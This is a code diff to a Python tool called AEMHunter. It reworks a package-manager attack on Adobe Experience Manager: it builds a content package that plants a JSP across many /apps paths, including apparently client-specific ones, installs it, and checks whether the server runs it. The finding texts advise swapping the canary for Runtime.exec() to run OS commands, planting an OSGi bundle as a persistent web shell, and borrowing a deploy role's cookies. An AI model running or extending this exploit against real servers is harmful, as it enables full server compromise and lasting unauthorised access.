@@ -1224,124 +1224,134 @@ class AEMHunter:
     def _packmgr_rce_poc(self, acting: str) -> None:
         canary = "AEMHUNTERRCE" + "".join(random.choices(string.ascii_uppercase, k=6))
         jsp = '<%= "' + canary + '-" + System.getProperty("user.name") %>'
-        grp = "aemhunter"
-        name = "aemhunter" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
-        pkgpath = f"/etc/packages/{grp}/{name}.zip"
-        zipbytes = self._build_vault_package(grp, name, {"apps/aemhunter/poc.jsp": jsp})
         ref = self.client.base_url + "/crx/packmgr/index.jsp"
         headers = {"Referer": ref}
         if self._csrf_token:
             headers["CSRF-Token"] = self._csrf_token
 
-        self.logger.info("upload+install RCE: building vault pkg, uploading, installing, executing...")
-        upload_ok = False
-        install_resp = None
-        upload_status = "n/a"
-        attempts = [
-            ("/crx/packmgr/service.jsp",
-             {}, {"cmd": "upload", "name": name, "force": "true", "install": "true"}),
-            ("/crx/packmgr/service/.json",
-             {"cmd": "upload"}, {"name": name, "force": "true", "install": "true"}),
-            ("/crx/packmgr/service/.json/etc/packages/%s/%s.zip" % (grp, name),
-             {"cmd": "upload"}, {"force": "true", "install": "true"}),
-        ]
-        for ep, params, data in attempts:
-            files = {"package": (name + ".zip", zipbytes, "application/zip"),
-                     "file": (name + ".zip", zipbytes, "application/zip")}
-            up = self.client.post(ep, params=params, data=data, files=files, headers=headers)
-            upload_status = getattr(up, "status_code", "ERR")
-            self.logger.debug(f"upload via {ep} -> {upload_status}: {safe_response_text(up, 120)}")
-            # Did the package actually land? Check the listing for our name.
+        # The role may be barred from /apps ROOT yet allowed to install into its
+        # OWN app (e.g. a CPB Content Package Deployer can write /apps/cpb). So
+        # try installing the JSP into each discoverable /apps subpath, not just one.
+        code_roots = ["/apps"]
+        code_roots += self._discover_apps_children()
+        code_roots += ["/apps/cpb", "/apps/citi-base", "/apps/citi-cgcpc", "/apps/cgcpc",
+                       "/apps/citi-foundation", "/apps/settings", "/libs"]
+        seen_roots: Set[str] = set()
+        roots: List[str] = []
+        for r in code_roots:
+            r = r.rstrip("/")
+            if r and r not in seen_roots:
+                seen_roots.add(r)
+                roots.append(r)
+        roots = roots[:12]
+
+        self.logger.info(f"upload+install RCE: trying {len(roots)} code path(s) for an "
+                         "installable+executable JSP...")
+        any_upload = False
+        any_install = False
+        last_status = "n/a"
+        for root in roots:
+            sub = "aemhunter" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
+            rel = f"{root.lstrip('/')}/{sub}/poc.jsp"          # apps/cpb/aemhunterXXXX/poc.jsp
+            folder_repo = f"{root}/{sub}"                       # /apps/cpb/aemhunterXXXX
+            jsp_repo = f"{folder_repo}/poc.jsp"
+            grp = "aemhunter"
+            name = "aemhunter" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
+            pkgpath = f"/etc/packages/{grp}/{name}.zip"
+            zipbytes = self._build_vault_package(grp, name, {rel: jsp})
+
+            # upload (install=true one-shot), try legacy .jsp then .json
+            up = self.client.post("/crx/packmgr/service.jsp",
+                                  data={"cmd": "upload", "name": name, "force": "true", "install": "true"},
+                                  files={"package": (name + ".zip", zipbytes, "application/zip")},
+                                  headers=headers)
+            if not (self._pkg_success(up) or (up and up.status_code in (200, 201))):
+                up = self.client.post("/crx/packmgr/service/.json", params={"cmd": "upload"},
+                                      data={"name": name, "force": "true", "install": "true"},
+                                      files={"package": (name + ".zip", zipbytes, "application/zip")},
+                                      headers=headers)
+            last_status = getattr(up, "status_code", "ERR")
             ls2 = self.client.get("/crx/packmgr/service.jsp?cmd=ls")
-            if self._pkg_success(up) or (ls2 and name in (ls2.text or "")):
-                upload_ok = True
-                # explicit install (in case install=true was ignored)
-                install_resp = self.client.post(f"/crx/packmgr/service/.json{pkgpath}",
-                                                 params={"cmd": "install"}, headers=headers)
-                self.client.post("/crx/packmgr/service.jsp",
-                                 data={"cmd": "inst", "name": name, "group": grp}, headers=headers)
-                break
+            uploaded = self._pkg_success(up) or (ls2 is not None and name in (ls2.text or ""))
+            if uploaded:
+                any_upload = True
+                inst = self.client.post(f"/crx/packmgr/service/.json{pkgpath}",
+                                        params={"cmd": "install"}, headers=headers)
+                if self._pkg_success(inst):
+                    any_install = True
 
-        # Classify the result by fetching the JSP: executed / installed-but-source / not-written.
-        ex = self.client.get("/apps/aemhunter/poc.jsp")
-        ex_status = getattr(ex, "status_code", "ERR")
-        ex_body = (ex.text if ex is not None else "") or ""
-        if canary in ex_body:
-            jsp_state = "executed"
-        elif ex is not None and ex.status_code == 200 and ("<%" in ex_body or "System.getProperty" in ex_body):
-            jsp_state = "installed-but-not-executed"   # JSP written but served as source
-        elif ex is None or ex.status_code == 404:
-            jsp_state = "not-written"
+            ex = self.client.get(jsp_repo)
+            executed = ex is not None and canary in (ex.text or "")
+
+            # cleanup this attempt no matter what
+            self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "uninstall"}, headers=headers)
+            self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "delete"}, headers=headers)
+            self._auth_post(folder_repo, data={":operation": "delete"})
+
+            if executed:
+                self.reporter.add(Finding(
+                    title=f"REMOTE CODE EXECUTION confirmed via package install {self._role_tag()}",
+                    severity=SEV_CRITICAL, category=CAT_RCE,
+                    target=self.target + jsp_repo,
+                    evidence=f"user={acting}: uploaded+installed a content package writing {jsp_repo} "
+                             f"and the server executed it: {snippet(ex.text, 160)}",
+                    description=(f"END-TO-END RCE: this role uploaded and installed a content package "
+                                 f"that wrote a JSP to {root} (a code/script space) and the server "
+                                 "executed attacker Java code. Full server compromise as the AEM "
+                                 "service user. Swap the canary for Runtime.exec() for OS command "
+                                 "execution, or ship an OSGi bundle for a persistent web shell."),
+                    references=["https://github.com/0ang3el/aem-rce-bundle",
+                                "https://github.com/0ang3el/aem-hacker"],
+                    request=f"POST /crx/packmgr/service.jsp (vault pkg writing {jsp_repo}, install=true) "
+                            f"then GET {jsp_repo} -> {canary}-<svcuser>",
+                    response_snippet=snippet(ex.text, 300), role=self.role,
+                ))
+                return
+
+        # Nothing executed — report precisely where it broke.
+        if not any_upload:
+            blocked = "UPLOAD denied"
+            nxt = ("Package Manager is read-only for THIS role. Try a package-deploy role "
+                   "('CPB Content Package Deployer').")
+        elif not any_install:
+            blocked = "INSTALL denied on every code path tried"
+            nxt = ("This role can create/upload packages but install was rejected for all of "
+                   f"{len(roots)} /apps paths tried. Find the role's actually-allowed target by "
+                   "reading an existing CPB package's filter (/etc/packages -> .../META-INF/"
+                   "vault/filter.xml) and install a JSP/bundle there, or use an OSGi-bundle "
+                   "package into <allowedAppRoot>/install (JcrInstaller runs as a system service).")
         else:
-            jsp_state = f"other(HTTP {ex_status})"
-
-        install_ok = self._pkg_success(install_resp)
-
-        # thorough cleanup regardless of outcome
-        self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "uninstall"}, headers=headers)
-        self.client.post(f"/crx/packmgr/service/.json{pkgpath}", params={"cmd": "delete"}, headers=headers)
-        self._auth_post("/apps/aemhunter", data={":operation": "delete"})
-
-        if jsp_state == "executed":
-            self.reporter.add(Finding(
-                title=f"REMOTE CODE EXECUTION confirmed via package install {self._role_tag()}",
-                severity=SEV_CRITICAL, category=CAT_RCE,
-                target=self.target + "/apps/aemhunter/poc.jsp",
-                evidence=f"Uploaded+installed a content package containing a JSP and the server "
-                         f"executed it: {snippet(ex_body, 160)}",
-                description=("END-TO-END RCE: uploaded and installed a content package containing "
-                             "a JSP and the server executed attacker Java code. Full server "
-                             "compromise as the AEM service user. Swap the canary for "
-                             "Runtime.exec() for OS command execution."),
-                references=["https://github.com/0ang3el/aem-rce-bundle",
-                            "https://github.com/0ang3el/aem-hacker"],
-                request="POST /crx/packmgr/service.jsp (multipart vault pkg, install=true) "
-                        "then GET /apps/aemhunter/poc.jsp -> canary",
-                response_snippet=snippet(ex_body, 300), role=self.role,
-            ))
-            return
-
-        # Not executed — say exactly where it broke, so it's actionable.
-        if not upload_ok:
-            blocked = "UPLOAD denied — the role cannot upload packages (package service is read-only for it)"
-            nxt = ("Package Manager is read-only for THIS role; package RCE needs a role with "
-                   "upload/install rights. Re-run the loop and paste the cookies of a "
-                   "package-deploy role — on Adobe Managed AEM that is 'CPB Content Package "
-                   "Deployer' (its whole purpose is installing packages = code). Otherwise the "
-                   "READ access here (full repo + secrets) is already the provable impact.")
-        elif not install_ok and jsp_state == "not-written":
-            blocked = "INSTALL denied — package uploaded but install did not write /apps"
-            nxt = "Upload works but install/activate is blocked. Try an OSGi-bundle package dropped into /apps/<x>/install (JcrInstaller runs as system), or find a writable /apps subpath."
-        elif jsp_state == "installed-but-not-executed":
-            blocked = "JSP-EXEC blocked — the JSP installed under /apps but is served as source, not executed"
-            nxt = "Direct .jsp execution is disabled. Try a sling:resourceType script + a content node that renders it, or an OSGi-bundle package for code exec."
-        else:
-            blocked = f"unclear (upload_ok={upload_ok}, install_ok={install_ok}, jsp={jsp_state})"
-            nxt = "Manual review of the package-manager responses recommended (run with -v)."
+            blocked = "INSTALL ok but JSP not executed"
+            nxt = ("A package installed but the JSP did not execute (direct .jsp execution may be "
+                   "disabled). Install a sling:resourceType script + a content node that renders "
+                   "it, or an OSGi bundle into <appRoot>/install for code execution.")
 
         self.reporter.add(Finding(
-            title=f"Package install RCE NOT achieved {self._role_tag()} — blocked at: {blocked.split(' —')[0]}",
+            title=f"Package install RCE NOT achieved {self._role_tag()} — blocked at: {blocked}",
             severity=SEV_HIGH, category=CAT_RCE,
             target=self.target + "/crx/packmgr/service.jsp",
-            evidence=f"user={acting} | upload_ok={upload_ok} (last status {upload_status}) | "
-                     f"install_ok={install_ok} | /apps/aemhunter/poc.jsp -> {jsp_state}",
+            evidence=f"user={acting} | upload_ok={any_upload} (last status {last_status}) | "
+                     f"install_ok={any_install} | tried {len(roots)} /apps code paths",
             description=(f"Package-manager RCE attempt result: {blocked}. Next: {nxt} "
-                         "Note: the confirmed READ access (full repo + secrets + replication "
-                         "creds + any user hashes) is already high, provable impact on its own."),
+                         "Note: create/upload rights alone are already critical — this role can "
+                         "stage arbitrary packages; combined with the confirmed full-repo READ "
+                         "it is high, provable impact."),
             references=["https://github.com/0ang3el/aem-rce-bundle"],
-            response_snippet=safe_response_text(install_resp or ex, 300), role=self.role,
+            role=self.role,
         ))
 
     def _build_vault_package(self, group: str, name: str, files: Dict[str, str]) -> bytes:
-        """Build a minimal FileVault content-package zip in memory."""
+        """Build a minimal FileVault content-package zip in memory. Creates an
+        nt:folder .content.xml for each file's parent so install lands cleanly
+        at any target path (not just /apps/aemhunter)."""
         import io
         import zipfile
         buf = io.BytesIO()
         with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
-            roots = sorted({"/" + p.rsplit("/", 1)[0] for p in files})
+            parents = sorted({p.rsplit("/", 1)[0] for p in files})  # e.g. apps/cpb/aemhunterX
             filt = '<?xml version="1.0" encoding="UTF-8"?>\n<workspaceFilter version="1.0">\n'
-            for rt in roots:
-                filt += f'  <filter root="{rt}"/>\n'
+            for par in parents:
+                filt += f'  <filter root="/{par}"/>\n'
             filt += '</workspaceFilter>\n'
             z.writestr("META-INF/vault/filter.xml", filt)
             z.writestr("META-INF/vault/properties.xml",
@@ -1352,11 +1362,12 @@ class AEMHunter:
                        f'  <entry key="group">{group}</entry>\n'
                        '  <entry key="version">1.0</entry>\n'
                        '</properties>\n')
-            z.writestr("jcr_root/apps/aemhunter/.content.xml",
-                       '<?xml version="1.0" encoding="UTF-8"?>\n'
-                       '<jcr:root xmlns:jcr="http://www.jcp.org/jcr/1.0" '
-                       'xmlns:nt="http://www.jcp.org/jcr/nt/1.0" '
-                       'jcr:primaryType="nt:folder"/>\n')
+            for par in parents:
+                z.writestr(f"jcr_root/{par}/.content.xml",
+                           '<?xml version="1.0" encoding="UTF-8"?>\n'
+                           '<jcr:root xmlns:jcr="http://www.jcp.org/jcr/1.0" '
+                           'xmlns:nt="http://www.jcp.org/jcr/nt/1.0" '
+                           'jcr:primaryType="nt:folder"/>\n')
             for relpath, content in files.items():
                 z.writestr("jcr_root/" + relpath, content)
         return buf.getvalue()
